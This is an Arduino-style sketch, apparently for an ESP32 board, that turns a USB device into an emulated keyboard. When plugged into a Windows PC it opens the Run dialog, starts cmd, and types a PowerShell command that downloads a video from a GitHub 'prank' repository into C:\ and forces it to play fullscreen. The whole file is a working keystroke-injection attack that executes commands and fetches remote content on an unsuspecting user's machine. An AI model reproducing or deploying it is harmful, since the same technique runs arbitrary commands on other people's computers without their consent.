#include "USB.h"
#include "USBHIDKeyboard.h"

USBHIDKeyboard Keyboard;

void setup() {
  USB.begin();
  Keyboard.begin();

  delay(3000); // ждём определение платы ПК

  // 1. Win + R
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(1500);

  // 2. Запускаем cmd
  Keyboard.print("cmd");
  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2000);

  // 3. Команда: скачать в C:\ и только потом показать
  String cmd =
    "powershell -NoProfile -Command \""
    "$ProgressPreference='SilentlyContinue'; "
    "if (Test-Path C:\\video.mp4) { Remove-Item C:\\video.mp4 -Force }; "
    "curl.exe -L -o C:\\video.mp4 https://github.com/tttimirtt-spec/prank/raw/main/video.mp4; "
    "if ((Test-Path C:\\video.mp4) -and ((Get-Item C:\\video.mp4).Length -gt 10000)) { "
      "if (Test-Path 'C:\\Program Files\\Windows Media Player\\wmplayer.exe') "
      "{ Start-Process 'C:\\Program Files\\Windows Media Player\\wmplayer.exe' -ArgumentList '/fullscreen','C:\\video.mp4' } "
      "else "
      "{ Start-Process C:\\video.mp4; Start-Sleep 4; (New-Object -ComObject WScript.Shell).SendKeys('{F11}') } "
    "} else { Write-Host 'DOWNLOAD FAILED'; pause }"
    "\"";

  Keyboard.print(cmd);
  delay(500);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
}

void loop() {}
